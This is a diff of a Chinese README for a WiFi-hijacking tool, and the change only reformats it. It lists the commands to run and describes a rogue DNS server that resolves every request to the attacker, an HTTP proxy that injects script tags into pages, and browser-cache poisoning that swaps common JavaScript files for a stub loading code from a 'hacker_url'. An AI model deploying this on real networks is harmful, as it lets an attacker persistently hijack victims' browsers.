@@ -16,17 +16,19 @@ http://www.cnblogs.com/index-html/p/wifi_hijack_3.html
 原理说明
 ==========
 
->>> cd tool
->>> phantomjs sniffer.js
-# 遍历url.txt地址，寻找 expires - now > MIN_CACHE_DAY 和 now - last-modified > MIN_STABLE_DAY 的js文件，写入 asset/list.txt (由于有的js页面并没有 LAST-MODIFIED 或 EXPIRES 就肯定不会被收录)
+##### 寻找最优缓存js链接
+`cd tools` <br>
+`phantomjs sniffer.js` <br>
+遍历url.txt地址，寻找 expires - now > MIN_CACHE_DAY 和 now - last-modified > MIN_STABLE_DAY 的js文件，写入 asset/list.txt (由于有的js页面并没有 LAST-MODIFIED 或 EXPIRES 就肯定不会被收录)
 
-# 启动服务
->>> node index.js
-# 启动了俩服务: dns服务(将所有dns请求都解析到本机) http服务(修改html页面和js文件)
+##### 启动服务
+`node index.js` <br>
+启动了俩服务: dns服务(将所有dns请求都解析到本机) http服务(修改html页面和js文件) 
 
-[F] proxy_web.js
-如果是html页面，则注入 <script src="http://[inject_url(见config.json文件)]"></script>
-如果是js页面，分两种情况：
-1.请求地址如果是inject_url, 则返回 asset/inject.js ($LIST替换为asset/list.txt), new Image().src='http://[asset/list.txt条目]' 会被浏览器立即下载并缓存
+##### 核心文件
+`proxy_web.js` <br>
+如果是html页面，则注入 `<script src="http://[inject_url(见config.json文件)]"></script>` <br>
+如果是js页面，分两种情况：<br>
+1.请求地址如果是inject_url, 则返回 asset/inject.js ($LIST替换为asset/list.txt), new Image().src='http://[asset/list.txt条目]' 会被浏览器立即下载并缓存 <br>
 2.请求地址如果是asset/list.txt中的某条目，则返回 asset/stub.js ($URL_HACKER替换为hacker_url@config.json文件，$URL_RAW替换为请求地址)
 
